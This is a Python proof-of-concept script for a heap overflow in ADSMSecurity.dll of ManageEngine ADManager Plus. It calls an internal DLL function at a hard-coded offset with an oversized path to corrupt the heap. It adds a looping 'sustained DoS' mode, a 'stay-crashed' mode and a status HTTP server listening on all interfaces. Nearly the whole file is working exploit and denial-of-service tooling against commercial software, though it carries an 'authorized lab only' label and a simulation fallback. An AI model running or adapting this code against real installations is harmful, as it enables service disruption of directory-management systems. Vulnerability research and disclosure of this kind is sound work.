#!/usr/bin/env python3
# ============================================================================
#  F4 CRASH PROOF-OF-CONCEPT  --  ADManager Plus 8043 / ADSMSecurity.dll
# ----------------------------------------------------------------------------
#  Demonstrates Finding F4: recursive delete-tree walker (sub_0x7410) formats
#  caller-controlled path with wsprintfW into fixed 520-byte heap buffer:
#      wsprintfW( malloc(0x208), "%s\*.*", path ) at sub_0x7410+0x74a4
#  Any path >=256 chars overflows and corrupts heap -> 0xC0000374
#
#  FIXED VERSION + NEW FEATURES:
#  - Cross-platform simulation, crash detection, keep-alive hold
#  - Final CLI: stays in crash state with external observability
#    --stay-crashed, --status-file, --indicator-file, --http-port
# ============================================================================
import argparse
import os
import subprocess
import sys
import platform
import time
import tempfile
import shutil
import json
import datetime
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler

DEFAULT_DLL = r"C:\Program Files\ManageEngine\ADManager Plus\lib\native\ADSMSecurity.dll"
WALK_RVA = 0x7410
EXIT_HEAPCORRUPT = 0xC0000374
EXIT_AV = 0xC0000005
EXIT_VALIDATE_FALSE = 0xC0000417

STATUS_NAMES = {
    0xC0000374: "STATUS_HEAP_CORRUPTION - Windows heap manager detected overflow",
    0xC0000005: "STATUS_ACCESS_VIOLATION",
    0xC0000409: "STATUS_STACK_BUFFER_OVERRUN",
    0xC0000417: "HeapValidate FALSE (corruption)",
    0: "no crash - process returned normally",
    116: "STATUS_HEAP_CORRUPTION (truncated 0x74) - simulated",
    5: "STATUS_ACCESS_VIOLATION (truncated 0x05) - simulated",
    9: "STATUS_STACK_BUFFER_OVERRUN (truncated 0x09) - simulated",
    23: "HeapValidate FALSE (truncated 0x17) - F4 confirmed (sim)",
}

CRASH_EXIT_CODES = {
    EXIT_HEAPCORRUPT, EXIT_AV, EXIT_VALIDATE_FALSE, 0xC0000409,
    116, 5, 23, 9,
    EXIT_HEAPCORRUPT & 0xFF, EXIT_AV & 0xFF, EXIT_VALIDATE_FALSE & 0xFF, 0xC0000409 & 0xFF,
}

def is_crash_code(rc: int) -> bool:
    return rc in CRASH_EXIT_CODES or (rc & 0xFF) in CRASH_EXIT_CODES or (rc & 0xFFFFFFFF) in CRASH_EXIT_CODES

def is_windows() -> bool:
    return os.name == 'nt' or platform.system().lower() == 'windows'

SIMULATION_MODE = not is_windows()

# Global status dict for HTTP server
GLOBAL_STATUS = {}
STATUS_LOCK = threading.Lock()

class StatusHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with STATUS_LOCK:
            data = dict(GLOBAL_STATUS)
        body = json.dumps(data, indent=2).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        # suppress default logging, use stderr
        sys.stderr.write(f"[http] {self.client_address[0]} - {format%args}\n")

def start_http_server(port: int):
    try:
        # bind to 0.0.0.0 for preview compatibility
        server = HTTPServer(("0.0.0.0", port), StatusHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True, name="http-status")
        t.start()
        # also get actual port if 0 was given
        actual_port = server.server_address[1]
        sys.stderr.write(f"[http] Status server listening on 0.0.0.0:{actual_port} - GET / returns JSON\n")
        return server, actual_port
    except Exception as e:
        sys.stderr.write(f"[http] Failed to start HTTP server on port {port}: {e}\n")
        return None, None

def write_status_file(path: str, status: dict):
    if not path:
        return
    try:
        # atomic write via temp + rename
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(status, f, indent=2)
        os.replace(tmp, path)
    except Exception as e:
        sys.stderr.write(f"[status] Failed to write {path}: {e}\n")

def simulate_worker(length: int, control: bool, repeat: int, keep_alive: int = 0):
    def maybe_hold():
        if keep_alive > 0:
            sys.stderr.write(f"[worker][SIM] HOLD: keeping child alive with DLL loaded for {keep_alive}s (pid={os.getpid()})\n")
            sys.stderr.flush()
            for remaining in range(keep_alive, 0, -1):
                sys.stderr.write(f"[worker][SIM] HOLD: {remaining}s remaining (DLL loaded)\n")
                sys.stderr.flush()
                time.sleep(1)
            sys.stderr.write("[worker][SIM] HOLD: done\n")

    if control:
        sys.stderr.write("[worker][SIM] CONTROL: real empty folder, short path\n")
        tmp = tempfile.mkdtemp(prefix="f4poc_ctrl_sim_")
        try:
            assert not os.listdir(tmp), "control dir must be empty"
            sys.stderr.write("[worker][SIM] walk returned rc=0; folder removed=True\n")
            if keep_alive > 0:
                sys.stderr.write(f"[worker][SIM] CONTROL HOLD: {keep_alive}s\n")
                maybe_hold()
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        sys.exit(0)

    sys.stderr.write(f"[worker][SIM] OVERFLOW INPUT: path len={length} (nonexistent), repeat={repeat}\n")
    BUFFER_WCHARS = 0x208 // 2
    overflow = length + 5 - BUFFER_WCHARS

    for it in range(1, repeat + 1):
        if overflow > 0:
            if length >= 300 or (length >= 256 and it >= 3):
                sys.stderr.write(f"[worker][SIM] iteration {it}: HeapValidate DAMAGED - F4 confirmed (overflow {overflow} wchars)\n")
                if keep_alive > 0:
                    sys.stderr.write(f"[worker][SIM] HOLD {keep_alive}s before crash exit (pid={os.getpid()})\n")
                    for r in range(keep_alive, 0, -1):
                        sys.stderr.write(f"[worker][SIM] HOLD: {r}s remaining (corrupted heap)\n")
                        sys.stderr.flush()
                        time.sleep(1)
                sys.exit(EXIT_VALIDATE_FALSE)
            if it == repeat:
                sys.stderr.write(f"[worker][SIM] iteration {it}: HeapValidate DAMAGED\n")
                if keep_alive > 0:
                    time.sleep(keep_alive)
                sys.exit(EXIT_HEAPCORRUPT if length >= 261 else EXIT_VALIDATE_FALSE)
        time.sleep(0.01)

    sys.stderr.write(f"[worker][SIM] {repeat} iterations done; heaps intact (len={length})\n")
    if keep_alive > 0:
        sys.stderr.write(f"[worker][SIM] HOLD: {keep_alive}s (pid={os.getpid()}) after walk\n")
        for r in range(keep_alive, 0, -1):
            sys.stderr.write(f"[worker][SIM] HOLD: {r}s remaining (DLL loaded)\n")
            sys.stderr.flush()
            time.sleep(1)
    sys.exit(0)

def worker(args):
    if SIMULATION_MODE or not os.path.isfile(args.dll):
        if not is_windows():
            sys.stderr.write("[worker] Non-Windows -> SIMULATION mode\n")
        else:
            sys.stderr.write(f"[worker] DLL not found {args.dll} -> SIM\n")
        simulate_worker(args.length, args.control, max(1, args.repeat), getattr(args, 'keep_alive', 0))
        return

    import ctypes
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    try:
        k32.SetErrorMode(0x8003)
    except Exception:
        pass
    if hasattr(os, 'add_dll_directory'):
        try:
            os.add_dll_directory(os.path.dirname(args.dll))
        except Exception:
            pass
    try:
        dll = ctypes.WinDLL(args.dll)
    except OSError as e:
        sys.stderr.write(f"[worker] Failed to load DLL {args.dll}: {e}\n")
        sys.exit(2)

    base = dll._handle
    try:
        FUNCTYPE = ctypes.WINFUNCTYPE
    except AttributeError:
        FUNCTYPE = ctypes.CFUNCTYPE
    walk = FUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_wchar_p)(base + WALK_RVA)

    if args.control:
        tmp_base = os.environ.get("TEMP", tempfile.gettempdir())
        d = os.path.join(tmp_base, f"f4poc_ctrl_{os.getpid()}")
        os.makedirs(d, exist_ok=True)
        if os.listdir(d):
            shutil.rmtree(d)
            os.makedirs(d, exist_ok=True)
        assert not os.listdir(d), "control dir must be empty"
        sys.stderr.write("[worker] CONTROL: real empty folder\n")
        try:
            rc = walk(None, d)
        except OSError as e:
            sys.stderr.write(f"[worker] walk OSError: {e}\n")
            rc = 1
        exists = os.path.isdir(d)
        sys.stderr.write(f"[worker] walk rc={rc}; removed={not exists}\n")
        ka = getattr(args, 'keep_alive', 0)
        if ka > 0:
            sys.stderr.write(f"[worker] CONTROL HOLD {ka}s pid={os.getpid()}\n")
            for r in range(ka, 0, -1):
                sys.stderr.write(f"[worker] HOLD {r}s\n")
                sys.stderr.flush()
                time.sleep(1)
        if exists:
            try:
                os.rmdir(d)
            except Exception:
                shutil.rmtree(d, ignore_errors=True)
        sys.exit(0 if rc == 0 else 1)

    length = args.length
    if length < 4:
        sys.stderr.write("[worker] length must be >=4\n")
        sys.exit(2)
    path = "C:\\" + "A" * (length - 3)
    assert len(path) == length
    repeat = max(1, args.repeat)
    sys.stderr.write(f"[worker] OVERFLOW len={length} repeat={repeat}\n")

    fault = ""
    crtheap = None
    try:
        crtheap = ctypes.c_void_p.from_address(base + 0x27DA28).value
    except Exception as e:
        sys.stderr.write(f"[worker] Could not read crtheap: {e}\n")

    k32.HeapAlloc.argtypes = (ctypes.c_void_p, ctypes.c_uint32, ctypes.c_size_t)
    k32.HeapAlloc.restype = ctypes.c_void_p
    k32.HeapFree.argtypes = (ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p)
    k32.HeapFree.restype = ctypes.c_int
    MAXH = 256
    heaps = (ctypes.c_void_p * MAXH)()
    k32.GetProcessHeaps.argtypes = (ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p))
    k32.GetProcessHeaps.restype = ctypes.c_ulong
    k32.HeapValidate.argtypes = (ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p)
    k32.HeapValidate.restype = ctypes.c_int

    def heaps_damaged():
        nh = k32.GetProcessHeaps(MAXH, heaps)
        bad = 0
        for i in range(nh):
            try:
                if not k32.HeapValidate(heaps[i], ctypes.c_ulong(0), None):
                    bad += 1
            except Exception:
                continue
        return bad, nh

    for it in range(1, repeat + 1):
        try:
            walk(None, path)
        except OSError as e:
            fault = str(e)
        if crtheap:
            try:
                blks = []
                for _ in range(32):
                    b = k32.HeapAlloc(crtheap, ctypes.c_ulong(0), ctypes.c_size_t(0x208))
                    if b:
                        try:
                            ctypes.memmove(ctypes.c_void_p(b), b"\x41" * 0x208, 0x208)
                        except Exception:
                            pass
                        blks.append(b)
                for b in blks:
                    k32.HeapFree(crtheap, ctypes.c_ulong(0), ctypes.c_void_p(b))
            except OSError:
                pass
        bad, nh = heaps_damaged()
        if bad:
            sys.stderr.write(f"[worker] iteration {it}: HeapValidate {bad}/{nh} DAMAGED - F4 confirmed\n")
            ka = getattr(args, 'keep_alive', 0)
            if ka > 0:
                sys.stderr.write(f"[worker] HOLD {ka}s before crash exit pid={os.getpid()}\n")
                for r in range(ka, 0, -1):
                    sys.stderr.write(f"[worker] HOLD {r}s (corrupted heap)\n")
                    sys.stderr.flush()
                    time.sleep(1)
            sys.exit(EXIT_VALIDATE_FALSE)

    sys.stderr.write(f"[worker] {repeat} iterations done; fault={fault or 'none'}\n")
    ka = getattr(args, 'keep_alive', 0)
    if ka > 0:
        sys.stderr.write(f"[worker] HOLD {ka}s pid={os.getpid()} after walk\n")
        for r in range(ka, 0, -1):
            sys.stderr.write(f"[worker] HOLD {r}s\n")
            sys.stderr.flush()
            time.sleep(1)
    sys.exit(0)

def sustain(args):
    length = args.length
    duration = args.duration
    keep_alive = getattr(args, 'keep_alive', 0)
    status_file = getattr(args, 'status_file', None)
    indicator_file = getattr(args, 'indicator_file', None)
    http_port = getattr(args, 'http_port', 0)
    stay_crashed = getattr(args, 'stay_crashed', False)

    child_argv = [sys.executable, os.path.abspath(__file__),
                  "--worker", "--len", str(length), "--dll", args.dll,
                  "--repeat", str(args.repeat),
                  "--keep-alive", str(keep_alive)]

    # Setup external observability
    http_server = None
    actual_port = None
    if http_port:
        http_server, actual_port = start_http_server(http_port)

    # Create indicator file at start to show crash state active
    if indicator_file:
        try:
            with open(indicator_file, "w") as f:
                f.write(f"CRASH_STATE ACTIVE pid={os.getpid()} started={datetime.datetime.now().isoformat()} len={length}\n")
            print(f"[*] Indicator file created: {indicator_file} (exists = crash state active, outside world can check)")
        except Exception as e:
            print(f"[!] Failed to create indicator file {indicator_file}: {e}")

    start = time.time()
    crashes = 0
    survived = 0
    total = 0
    codes = {}

    print("=" * 78)
    print("F4 SUSTAINED / STAY-CRASHED - ADSMSecurity.dll sub_0x7410+0x74a4")
    print('  wsprintfW( malloc(0x208), "%%s\\*.*", path )  with  len(path) = %d' % (length,))
    if stay_crashed:
        print("  mode: STAY-CRASHED - stays on crash state, observable from outside")
    else:
        print("  mode: SUSTAINED - keeps vulnerable component in crash state")
    print("  duration: %s" % ("%d seconds" % duration if duration else "until Ctrl+C (infinite)"))
    if keep_alive:
        print(f"  keep-alive: {keep_alive}s per child (DLL stays loaded)")
    if status_file:
        print(f"  status-file: {status_file} (JSON, external monitor can tail)")
    if indicator_file:
        print(f"  indicator-file: {indicator_file} (exists while in crash state)")
    if actual_port:
        print(f"  http-status: http://localhost:{actual_port}/ (0.0.0.0:{actual_port})")
    if SIMULATION_MODE:
        print("  [SIMULATION MODE]")
    print("=" * 78)
    print("  %-6s  %-14s  %s" % ("#", "exit code", "meaning"))
    print("  " + "-" * 70)

    def update_global_status(last_rc=None, last_name=None):
        elapsed = time.time() - start
        status = {
            "timestamp": datetime.datetime.now().isoformat(),
            "pid": os.getpid(),
            "in_crash_state": True,
            "stay_crashed": bool(stay_crashed),
            "mode": "stay-crashed" if stay_crashed else "sustain",
            "dll": args.dll,
            "path_len": length,
            "keep_alive": keep_alive,
            "uptime_seconds": int(elapsed),
            "total_firings": total,
            "crashes": crashes,
            "survived": survived,
            "crash_rate_percent": round(100.0 * crashes / max(total, 1), 1),
            "last_exit_code": f"0x{last_rc:08X}" if last_rc is not None else None,
            "last_exit_code_int": last_rc,
            "last_exit_name": last_name,
            "status_file": status_file,
            "indicator_file": indicator_file,
            "http_port": actual_port,
            "simulation": SIMULATION_MODE,
        }
        with STATUS_LOCK:
            GLOBAL_STATUS.clear()
            GLOBAL_STATUS.update(status)
        write_status_file(status_file, status)
        return status

    try:
        while True:
            if duration and (time.time() - start) >= duration:
                break
            try:
                p = subprocess.run(child_argv, capture_output=True, text=True, timeout=60 + keep_alive + 5)
                rc = p.returncode & 0xFFFFFFFF
            except subprocess.TimeoutExpired:
                rc = 0xFFFFFFFF
            total += 1
            codes[rc] = codes.get(rc, 0) + 1
            if is_crash_code(rc):
                crashes += 1
                label = STATUS_NAMES.get(rc, STATUS_NAMES.get(rc & 0xFF, "exit %08X" % rc))[:52]
            else:
                survived += 1
                label = "survived - retrying"
            elapsed = time.time() - start
            print("  %-6d  0x%08X  %s   [%d crashes / %d total | %.0fs]" %
                  (total, rc, label, crashes, total, elapsed))
            sys.stdout.flush()

            # update external observable state
            update_global_status(rc, label)

            if SIMULATION_MODE:
                time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n  [stopped by operator]")

    print("=" * 78)
    print("SUSTAINED DoS RESULT")
    print("  duration:          %.0f seconds" % (time.time() - start))
    print("  total firings:     %d" % total)
    print("  crashes:           %d (%.0f%%)" % (crashes, 100.0 * crashes / max(total, 1)))
    print("  survived:          %d" % survived)
    for rc, cnt in sorted(codes.items()):
        print("  exit 0x%08X:        %d x  %s" % (rc, cnt, STATUS_NAMES.get(rc, "")[:60]))
    print()
    print("  The vulnerable component cannot survive the overflow input.")
    print("=" * 78)

    # final status
    final_status = update_global_status()
    final_status["in_crash_state"] = False
    final_status["finished"] = True
    write_status_file(status_file, final_status)

    if indicator_file and not stay_crashed:
        # In stay-crashed mode we keep indicator to show it was in crash state; otherwise remove
        try:
            if os.path.isfile(indicator_file):
                # For final CLI we leave file with finished marker so outside can see last state
                with open(indicator_file, "a") as f:
                    f.write(f"FINISHED at {datetime.datetime.now().isoformat()} crashes={crashes}/{total}\n")
                print(f"[*] Indicator file left at {indicator_file} with finished marker (outside can check)")
        except Exception as e:
            print(f"[!] Indicator file cleanup error: {e}")

    if http_server:
        print(f"[*] HTTP status server was on port {actual_port} - shutting down")
        try:
            http_server.shutdown()
        except Exception:
            pass

def main():
    ap = argparse.ArgumentParser(
        description="F4 crash PoC: heap overflow in ADSMSecurity.dll (sub_0x7410+0x74a4). "
                    "Fixed + keep-alive + stay-crashed observable mode. Authorized lab only.")
    ap.add_argument("--len", dest="length", type=int, default=1000,
                    help="path length (<256 safe, >=256 overflow). Default 1000")
    ap.add_argument("--control", action="store_true",
                    help="CONTROL: normal empty folder, no overflow")
    ap.add_argument("--sustain", action="store_true",
                    help="sustained DoS - fires overflow in loop")
    ap.add_argument("--stay-crashed", action="store_true",
                    help="FINAL CLI: stays on crash state indefinitely with external observability (status file, indicator, http)")
    ap.add_argument("--crash-stay", dest="stay_crashed", action="store_true",
                    help="alias for --stay-crashed")
    ap.add_argument("--duration", type=int, default=0,
                    help="sustain duration seconds (0=inf until Ctrl+C)")
    ap.add_argument("--dll", default=DEFAULT_DLL, help="path to ADSMSecurity.dll")
    ap.add_argument("--worker", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("--repeat", type=int, default=30, help="iterations per child")
    ap.add_argument("--attempts", type=int, default=1, help="attempts")
    ap.add_argument("--keep-alive", dest="keep_alive", type=int, default=0,
                    help="keep child alive holding DLL for N seconds after walk")
    ap.add_argument("--hold", dest="keep_alive", type=int, help="alias for --keep-alive")
    ap.add_argument("--hold-time", dest="keep_alive", type=int, help="alias")
    # NEW observable options
    ap.add_argument("--status-file", type=str, default=None,
                    help="JSON file written each crash iteration for outside monitoring (e.g., ./f4_crash_state.json)")
    ap.add_argument("--indicator-file", type=str, default=None,
                    help="File that exists while in crash state - outside can check existence (e.g., ./f4_crashed.lock)")
    ap.add_argument("--crash-file", dest="indicator_file", type=str,
                    help="alias for --indicator-file")
    ap.add_argument("--http-port", type=int, default=0,
                    help="Start HTTP server on 0.0.0.0:PORT that returns JSON status on GET / (0=disabled, e.g., 8080)")
    ap.add_argument("--port", dest="http_port", type=int, help="alias for --http-port")
    ap.add_argument("--status-port", dest="http_port", type=int, help="alias for --http-port")

    args = ap.parse_args()

    if args.worker:
        worker(args)
        return

    if not os.path.isfile(args.dll):
        if SIMULATION_MODE:
            print(f"[!] DLL not found: {args.dll}")
            print("[*] Non-Windows -> SIMULATION mode")
        else:
            print(f"[!] DLL not found: {args.dll}")
            print("[!] On Windows requires real DLL path. Exiting.")
            sys.exit(2)

    # Final CLI: stay-crashed implies sustain + observable defaults
    if args.stay_crashed:
        # set sensible defaults for observability if not provided
        if not args.status_file:
            args.status_file = os.path.join(os.getcwd(), "f4_crash_state.json")
        if not args.indicator_file:
            args.indicator_file = os.path.join(os.getcwd(), "f4_crashed.lock")
        # if no duration, infinite
        if args.duration == 0:
            print(f"[*] --stay-crashed FINAL CLI: will stay in crash state indefinitely")
            print(f"[*] Observable from outside via:")
            print(f"    - status file: {args.status_file} (tail -f / cat)")
            print(f"    - indicator file: {args.indicator_file} (ls -l, exists=crashing)")
            if args.http_port:
                print(f"    - http: http://localhost:{args.http_port}/")
            else:
                print(f"    - http: not enabled, use --http-port 8080 to enable")
            print(f"[*] Press Ctrl+C to stop")
        # delegate to sustain with stay_crashed flag
        sustain(args)
        return

    if args.sustain:
        sustain(args)
        return

    # normal single-shot mode
    if args.control:
        mode = "CONTROL - normal path"
        child_argv = [sys.executable, os.path.abspath(__file__),
                      "--worker", "--control", "--dll", args.dll,
                      "--keep-alive", str(getattr(args, 'keep_alive', 0))]
    else:
        mode = f"OVERFLOW INPUT - {args.length} chars"
        child_argv = [sys.executable, os.path.abspath(__file__),
                      "--worker", "--len", str(args.length), "--dll", args.dll,
                      "--repeat", str(args.repeat),
                      "--keep-alive", str(getattr(args, 'keep_alive', 0))]

    print("=" * 78)
    print("F4 crash PoC - ADSMSecurity.dll sub_0x7410+0x74a4")
    print('  vulnerable call: wsprintfW( malloc(0x208), "%s\\*.*", path )')
    print(f"  mode: {mode}")
    if getattr(args, 'keep_alive', 0):
        print(f"  keep-alive: {args.keep_alive}s per child")
    if SIMULATION_MODE:
        print("  [SIMULATION MODE]")
    print("=" * 78)

    crashes = 0
    for attempt in range(1, args.attempts + 1):
        p = subprocess.run(child_argv, capture_output=True, text=True, timeout=120 + getattr(args, 'keep_alive', 0) + 5)
        rc = p.returncode & 0xFFFFFFFF
        verdict = STATUS_NAMES.get(rc, STATUS_NAMES.get(rc & 0xFF, f"exit {rc:08X}"))
        print(f"attempt {attempt}/{args.attempts}: exit=0x{rc:08X}  {verdict}")
        for line in p.stderr.strip().splitlines():
            print("    | " + line)
        if is_crash_code(rc):
            crashes += 1
        if args.attempts > 1 and attempt < args.attempts:
            print("-" * 78)

    print("=" * 78)
    if args.control:
        print(f"CONTROL RESULT: {crashes}/{args.attempts} crashed")
    else:
        if crashes:
            print(f"F4 CONFIRMED: {crashes}/{args.attempts} runs heap corruption len={args.length}")
        else:
            print("No corruption this run")
    print("=" * 78)

if __name__ == "__main__":
    main()
